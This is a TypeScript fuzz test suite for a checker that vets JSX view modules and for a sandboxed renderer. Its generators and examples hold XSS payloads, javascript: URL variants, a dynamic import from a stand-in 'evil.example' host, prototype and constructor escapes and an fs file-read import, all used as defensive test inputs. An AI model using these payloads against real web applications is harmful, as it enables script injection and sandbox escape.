/**
 * Fuzzing the checker and the realm behind it.
 *
 * Three properties: the checker is total, it refuses every hostile fragment
 * wherever one lands in an otherwise valid module, and nothing it accepts
 * renders a refused element, an event handler, a link or a remote source,
 * whatever the props carry. Counterexamples the fuzzer found are kept as
 * `examples`, so each runs on every run.
 */
import { Effect, Exit, Redacted, Scope } from "effect"
import * as fc from "fast-check"
import { afterAll, beforeAll, describe, expect, it } from "vitest"
import { PresentationRealm, ViewCode } from "../src/index.ts"
import { refusedElements, refusedNames, refusedProperties } from "../src/internal/vocabulary.ts"
import { bundle } from "./fixtures/bundle.ts"
import { unsafeMarkup } from "./fixtures/markup.ts"
import { components } from "./fixtures/modules.ts"
import { layerSingleFile } from "./fixtures/quickjs.ts"

const check = (source: string) => Effect.runSync(Effect.exit(ViewCode.check(source, { components })))

/** A module with one hole in each place a fragment can go. */
const host = (
  hole: { readonly top?: string; readonly body?: string; readonly jsx?: string; readonly attribute?: string }
) =>
  `import { Card } from "@smthrs/ui"
${hole.top ?? ""}
export default function View({ props }: { props: { title: string } }) {
  ${hole.body ?? ""}
  return <Card><p className="a" ${hole.attribute ?? ""}>{props.title}</p>${hole.jsx ?? ""}</Card>
}
`

const lowerFirst = (text: string) => text.slice(0, 1).toLowerCase() + text.slice(1)

const hostile: fc.Arbitrary<Parameters<typeof host>[0]> = fc.oneof(
  fc.constantFrom(...refusedProperties).map((name) => ({ jsx: `<Card.${name} />` })),
  fc.constantFrom(...refusedNames).map((name) => ({ jsx: `<${name}.View />` })),
  fc.constantFrom(...refusedNames).filter((name) => /^[A-Z]/.test(name)).map((name) => ({ jsx: `<${name} />` })),
  fc.constantFrom(...refusedNames).map((name) => ({ body: `const value = ${name}` })),
  fc.constantFrom(...refusedNames).map((name) => ({ jsx: `{String(${name})}` })),
  fc.mixedCase(fc.constantFrom(...refusedElements)).map((element) => ({ jsx: `<${lowerFirst(element)} />` })),
  fc.tuple(fc.mixedCase(fc.constant("on")), fc.stringMatching(/^[A-Za-z]{1,12}$/)).map(([on, rest]) => ({
    attribute: `${on}${rest}="alert(1)"`
  })),
  fc.mixedCase(fc.constantFrom("href", "src", "action", "formAction", "srcSet", "srcdoc", "dangerouslySetInnerHTML"))
    .map((
      name
    ) => ({ attribute: `${name}={props.title}` })),
  fc.tuple(fc.mixedCase(fc.constantFrom("javascript", "vbscript")), fc.stringMatching(/^[ \t]{0,3}$/)).map((
    [scheme, gap]
  ) => ({ body: `const url = ${JSON.stringify(`${scheme}${gap}:alert(1)`)}` })),
  fc.constantFrom(
    { body: "import(\"https://evil.example/x.js\")" },
    { body: "const meta = import.meta" },
    { body: "const f = (() => 1).constructor" },
    { body: "const p = ({})[\"__proto__\"]" },
    { body: "const r = Math.random()" },
    { body: "debugger" },
    { top: "import { readFileSync } from \"fs\"" },
    { top: "export * from \"react\"" },
    { top: "export const leak = 1" },
    { body: "const s = \"<!--\"" },
    { jsx: "<div dangerouslySetInnerHTML={{ __html: props.title }} />" }
  )
)

describe("ViewCode.check, fuzzed", () => {
  it("never throws, and every refusal names at least one problem", () => {
    fc.assert(
      fc.property(
        fc.oneof(fc.string({ unit: "binary", maxLength: 400 }), fc.string({ unit: "grapheme-ascii", maxLength: 400 })),
        (source) => {
          const exit = check(source)
          if (Exit.isFailure(exit)) {
            const error = exit.cause.reasons[0]
            expect(error?._tag).toBe("Fail")
            const failure = (error as { readonly error: ViewCode.ViewCodeError }).error
            expect(["too_large", "malformed_text", "syntax", "refused"]).toContain(failure.reason)
            expect(Redacted.value(failure.problems).length).toBeGreaterThan(0)
          }
        }
      ),
      {
        numRuns: 500,
        examples: [
          // Counterexamples where @babel/parser and sucrase disagree: each must stay a typed syntax error.
          ["export default function View() { return 'y'<T,>as\"x\" }"],
          ["export default function View() { return yieldxxdefault&amp;declare;abstract }"],
          ["export default function View() { return accessor\ndeclare;satisfies1 }"]
        ]
      }
    )
  })

  it("refuses every hostile fragment, wherever it lands", () => {
    fc.assert(
      fc.property(hostile, (hole) => {
        expect(Exit.isFailure(check(host(hole)))).toBe(true)
      }),
      {
        numRuns: 1_000,
        examples: [
          // A handler whose name is only `on` plus one letter.
          [{ attribute: "onA=\"x\"" }],
          // A tab between the scheme and its colon.
          [{ body: "const url = \"JaVaScRiPt\\t:alert(1)\"" }],
          // An SVG element whose lowercase form is refused.
          [{ jsx: "<foreignObject />" }],
          [{ jsx: "<Card.constructor />" }],
          [{ jsx: "<window.View />" }],
          [{ jsx: "<Function />" }]
        ]
      }
    )
  })

  it("accepts the host module with no fragment", () => {
    expect(Exit.isSuccess(check(host({})))).toBe(true)
  })
})

describe("PresentationRealm output, fuzzed", () => {
  let scope: Scope.Closeable
  let realm: PresentationRealm.Realm

  beforeAll(async () => {
    scope = await Effect.runPromise(Scope.make())
    realm = await Effect.runPromise(
      PresentationRealm.make({ bundle: await bundle() }).pipe(Scope.provide(scope), Effect.provide(layerSingleFile))
    )
  }, 60_000)

  afterAll(async () => {
    await Effect.runPromise(Scope.close(scope, Exit.void))
  })

  const element: fc.Arbitrary<string> = fc.letrec<{ node: string }>((tie) => ({
    node: fc.oneof(
      { depthSize: "small", withCrossShrink: true },
      fc.string({ maxLength: 12 }).map((text) => `{${JSON.stringify(text)}}`),
      fc.constant("{props.text}"),
      fc.tuple(
        fc.constantFrom(
          "div",
          "p",
          "span",
          "section",
          "ul",
          "li",
          "table",
          "tbody",
          "tr",
          "td",
          "strong",
          "code",
          "label",
          "svg",
          "g"
        ),
        fc.array(
          fc.constantFrom(
            "className=\"x\"",
            "role=\"note\"",
            "title={props.text}",
            "aria-label={props.text}",
            "data-slot=\"s\""
          ),
          { maxLength: 3 }
        ),
        fc.array(tie("node"), { maxLength: 3 })
      ).map(([tag, attributes, children]) => `<${tag} ${attributes.join(" ")}>${children.join("")}</${tag}>`),
      fc.constantFrom(
        "<input name=\"q\" value={props.text} />",
        "<img alt=\"x\" src=\"data:image/png;base64,AA\" />",
        "<br />"
      )
    )
  })).node

  /** Text that tries to break out of an attribute or a text node. */
  const breakout = fc.oneof(
    fc.string({ unit: "binary", maxLength: 40 }),
    fc.constantFrom(
      "\"><script>alert(1)</script>",
      "' onmouseover='alert(1)",
      "</p><iframe src=//evil>",
      "<img src=x onerror=alert(1)>"
    )
  )

  it("renders nothing a frame would load, run or follow, whatever the props carry", async () => {
    await fc.assert(
      fc.asyncProperty(element, breakout, async (jsx, text) => {
        const exit = check(
          `export default function View({ props }: { props: { text: string } }) { return <div>${jsx}</div> }`
        )
        if (Exit.isFailure(exit)) return
        const html = await Effect.runPromise(realm.render({ module: exit.value, props: { text }, state: null }))
        expect(unsafeMarkup(html)).toBeUndefined()
      }),
      {
        numRuns: 300,
        examples: [
          // Escaped quotes in a text node read like an attribute to a naive scan.
          ["{props.text}", "' onmouseover='alert(1)"],
          ["<p title={props.text}>x</p>", "\"><script>alert(1)</script>"]
        ]
      }
    )
  })

  it("refuses at render time any prop bag a spread smuggles in, or renders it safely", async () => {
    const module = Effect.runSync(ViewCode.check(
      "export default function View({ props }: { props: { attributes: Record<string, string> } }) { return <div {...props.attributes}>x</div> }",
      { components }
    ))
    const key = fc.oneof(
      fc.mixedCase(
        fc.constantFrom(
          "onclick",
          "onerror",
          "href",
          "src",
          "action",
          "formaction",
          "srcset",
          "srcdoc",
          "dangerouslySetInnerHTML"
        )
      ),
      fc.constantFrom("className", "title", "role", "data-x", "style-x")
    )
    await fc.assert(
      fc.asyncProperty(fc.dictionary(key, breakout, { maxKeys: 4 }), async (attributes) => {
        const exit = await Effect.runPromise(Effect.exit(realm.render({ module, props: { attributes }, state: null })))
        if (Exit.isSuccess(exit)) expect(unsafeMarkup(exit.value)).toBeUndefined()
      }),
      {
        numRuns: 300,
        examples: [
          [{ className: "<img src=x onerror=alert(1)>" }],
          [{ OnClick: "alert(1)", hReF: "javascript:alert(1)" }]
        ]
      }
    )
  })
})
